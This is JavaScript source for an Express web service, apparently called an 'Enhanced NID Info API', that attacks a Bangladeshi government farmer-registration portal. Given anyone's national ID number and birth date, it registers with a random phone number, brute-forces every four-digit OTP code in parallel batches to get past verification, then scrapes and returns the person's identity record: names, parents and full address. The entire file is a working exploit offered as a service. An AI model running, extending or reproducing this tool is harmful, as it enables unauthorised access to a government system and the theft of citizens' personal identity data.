const express = require('express');
const axios = require('axios');
const cors = require('cors');
const cheerio = require('cheerio');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// Configuration
const MOBILE_PREFIX = "016";
const BATCH_SIZE = 500;
const MAX_WORKERS = 100;
const TARGET_LOCATION = "http://fsmms.dgf.gov.bd/bn/step2/movementContractor/form";

// Enhanced headers from Python code
const BASE_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Cache-Control': 'max-age=0',
    'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'Origin': 'https://fsmms.dgf.gov.bd',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Accept-Language': 'en-US,en;q=0.9',
};

// Helper functions
function randomMobile(prefix) {
    return prefix + Math.random().toString().slice(2, 10);
}

function randomPassword() {
    const uppercase = String.fromCharCode(65 + Math.floor(Math.random() * 26));
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let randomChars = '';
    for (let i = 0; i < 8; i++) {
        randomChars += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return "#" + uppercase + randomChars;
}

function generateOTPRange() {
    const range = [];
    for (let i = 0; i < 10000; i++) {
        range.push(i.toString().padStart(4, '0'));
    }
    return range;
}

async function getSessionAndBypass(nid, dob, mobile, email) {
    try {
        const url = 'https://fsmms.dgf.gov.bd/farmers/bn/register';

        const headers = {
            ...BASE_HEADERS,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'https://fsmms.dgf.gov.bd/portal/bn/farmer/registration',
            'Origin': 'https://fsmms.dgf.gov.bd'
        };

        const params = new URLSearchParams({
            nid: nid,
            dob: dob,
            mobile: mobile,
            email: email || ''
        });

        const response = await axios.post(url, params.toString(), {
            maxRedirects: 0,
            validateStatus: null,
            headers: headers
        });

        if (response.status === 302 && response.headers.location && response.headers.location.includes('verification')) {
            const cookies = response.headers['set-cookie'] || [];
            return {
                cookies,
                session: axios.create({
                    headers: {
                        ...BASE_HEADERS,
                        'Cookie': cookies.join('; ')
                    }
                })
            };
        } else {
            throw new Error('Bypass failed — check NID, DOB, or mobile');
        }
    } catch (error) {
        throw new Error('Session creation failed: ' + error.message);
    }
}

async function tryOTP(session, cookies, otp) {
    try {
        const url = `https://fsmms.dgf.gov.bd/farmers/bn/verify-otp?otp1=${otp[0]}&otp2=${otp[1]}&otp3=${otp[2]}&otp4=${otp[3]}`;

        const headers = {
            ...BASE_HEADERS,
            'Cookie': cookies.join('; '),
            'Referer': 'https://fsmms.dgf.gov.bd/portal/bn/farmer/otp-verification',
            'Upgrade-Insecure-Requests': '1',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
        };

        const response = await session.get(url, {
            maxRedirects: 0,
            validateStatus: null,
            headers
        });

        if (response.status === 302 && response.headers.location && response.headers.location.includes('success')) {
            return otp;
        }

        if (response.status === 200 && response.data.includes('কৃষক নিবন্ধন')) {
            return otp;
        }

        return null;
    } catch (error) {
        return null;
    }
}

async function tryBatch(session, cookies, otpBatch) {
    const promises = otpBatch.map(otp => tryOTP(session, cookies, otp));
    
    for (let i = 0; i < promises.length; i++) {
        const result = await promises[i];
        if (result) return result;
    }
    return null;
}

async function fetchFormData(session, cookies) {
    try {
        const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form';
        const headers = {
            ...BASE_HEADERS,
            'Cookie': cookies.join('; '),
            'Sec-Fetch-Site': 'cross-site',
            'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
        };

        const response = await session.get(url, { headers: headers });
        return response.data;
    } catch (error) {
        throw new Error('Form data fetch failed: ' + error.message);
    }
}

function extractFields(html) {
    const $ = cheerio.load(html);

    return {
        // Basic information
        contractorName: $('#name').val() || "",
        fatherName: $('#father').val() || "",
        motherName: $('#mother').val() || "",
        
        // Names in both languages
        nameEnglish: $('#name').val() || "",
        nameBangla: $('#nameBn').val() || "",
        
        // Gender information
        gender: $('#gender').val() || "",
        genderDisplay: $('input[name="gender"]').next('input').val() || "", // Display value
        
        nationality: $('#nationality').val() || "",
        
        // NID versions
        nidV1: $('#nidV1').val() || "",
        nidV2: $('#nidV2').val() || "",
        nidV3: $('#nidV3').val() || "",
        
        // Occupation
        occupation: $('#occupation').val() || "",
        
        // Contact info
        mobile: $('#mobile').val() || "",
        
        // Permanent address (NID address)
        nidPerDivision: $('#perDivision').val() || "",
        nidPerDistrict: $('#perDistrict').val() || "",
        nidPerUpazila: $('#perUpazila').val() || "",
        nidPerUnion: $('#perUnion').val() || "",
        nidPerVillage: $('#perVillage').val() || "",
        nidPerWard: $('#perWard').val() || "",
        nidPerZipCode: $('#perPostcode').val() || "",
        nidPerPostOffice: $('#perPostOffice').val() || "",
        nidPerHolding: $('#perAddressLine1').val() || "",
        nidPerMouza: "", // Not available in the form
        
        
        // Additional hidden fields
        status: $('#status').val() || "",
        locationId: $('#locationId').val() || ""
    };
}

function enrichData(contractor_name, result, nid, dob) {
    const mapped = {
        "nameBangla": result.nameBangla||"",
        "nameEnglish": result.nameEnglish||"",
        "nationalId": result.nidV3||"",
        "pin": result.nidV1||"",
        "dateOfBirth": dob,
        "fatherName": result.fatherName || "",
        "motherName": result.motherName || "",
        "spouseName": result.spouseName || "",
        "gender": "",
        "religion": "",
        "birthPlace": result.nidPerDistrict || "",
        "nationality": result.nationality || "",
        "division": result.nidPerDivision || "",
        "district": result.nidPerDistrict || "",
        "upazila": result.nidPerUpazila || "",
        "union": result.nidPerUnion || "",
        "village": result.nidPerVillage || "",
        "ward": result.nidPerWard || "",
        "zip_code": result.nidPerZipCode || "",
        "post_office": result.nidPerPostOffice || ""
    };

    const address_parts = [
        `বাসা/হোল্ডিং: ${result.nidPerHolding || '-'}`,
        `গ্রাম/রাস্তা: ${result.nidPerVillage || ''}`,
        `মৌজা/মহল্লা: ${result.nidPerMouza || ''}`,
        `ইউনিয়ন ওয়ার্ড: ${result.nidPerUnion || ''}`,
        `ডাকঘর: ${result.nidPerPostOffice || ''} - ${result.nidPerZipCode || ''}`,
        `উপজেলা: ${result.nidPerUpazila || ''}`,
        `জেলা: ${result.nidPerDistrict || ''}`,
        `বিভাগ: ${result.nidPerDivision || ''}`
    ];

    const filtered_parts = address_parts.filter(part => {
        const parts = part.split(": ");
        return parts[1] && parts[1].trim() && parts[1] !== "-";
    });

    const address_line = filtered_parts.join(", ");

    mapped.permanentAddress = address_line;
    mapped.presentAddress = address_line;

    return mapped;
}

// Base route
app.get('/snsvapi', (req, res) => {
    res.json({
        message: 'Enhanced NID Info API is running',
        status: 'active',
        endpoints: {
            getInfo: '/snsvapi/get-info?nid=YOUR_NID&dob=YYYY-MM-DD'
        }
    });
});

// Main info route
app.get('/snsvapi/get-info', async(req, res) => {
    try {
        const { nid, dob } = req.query;

        if (!nid || !dob) {
            return res.status(400).json({ error: 'NID and DOB are required' });
        }

        const password = randomPassword();
        const mobile = randomMobile(MOBILE_PREFIX);

        const { session, cookies } = await getSessionAndBypass(nid, dob, mobile, password);

        let otpRange = generateOTPRange();
        for (let i = otpRange.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [otpRange[i], otpRange[j]] = [otpRange[j], otpRange[i]];
        }

        let foundOTP = null;
        for (let i = 0; i < otpRange.length; i += BATCH_SIZE) {
            const batch = otpRange.slice(i, i + BATCH_SIZE);
            foundOTP = await tryBatch(session, cookies, batch);
            if (foundOTP) break;
        }

        if (foundOTP) {
            const html = await fetchFormData(session, cookies);

            const ids = [
                "contractorName", "fatherName", "motherName", "spouseName", 
                "nidPerDivision", "nidPerDistrict", "nidPerUpazila", "nidPerUnion", 
                "nidPerVillage", "nidPerWard", "nidPerZipCode", "nidPerPostOffice",
                "nidPerHolding", "nidPerMouza"
            ];

            const extractedData = extractFields(html, ids);
            const finalData = enrichData(extractedData.contractorName || "", extractedData, nid, dob);

            res.json({
                success: true,
                data: finalData,
                sessionInfo: {
                    mobileUsed: mobile,
                    otpFound: foundOTP
                }
            });
        } else {
            res.status(404).json({ 
                success: false,
                error: "OTP not found after trying all combinations" 
            });
        }

    } catch (error) {
        res.status(500).json({ 
            success: false,
            error: error.message 
        });
    }
});

// Health check
app.get('/snsvapi/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        timestamp: new Date().toISOString(),
        service: 'Enhanced NID Info API',
        version: '2.0.0'
    });
});

// Test credentials
app.get('/snsvapi/test-creds', (req, res) => {
    const mobile = randomMobile(MOBILE_PREFIX);
    const password = randomPassword();
    res.json({ mobile, password, note: 'Randomly generated test credentials' });
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Enhanced NID Info API running on port ${PORT}`);
    console.log(`📍 Main endpoint: http://localhost:${PORT}/snsvapi/get-info?nid=YOUR_NID&dob=YYYY-MM-DD`);
    console.log(`🔧 Test endpoint: http://localhost:${PORT}/snsvapi/test-creds`);
    console.log(`❤️  Health check: http://localhost:${PORT}/snsvapi/health`);
});
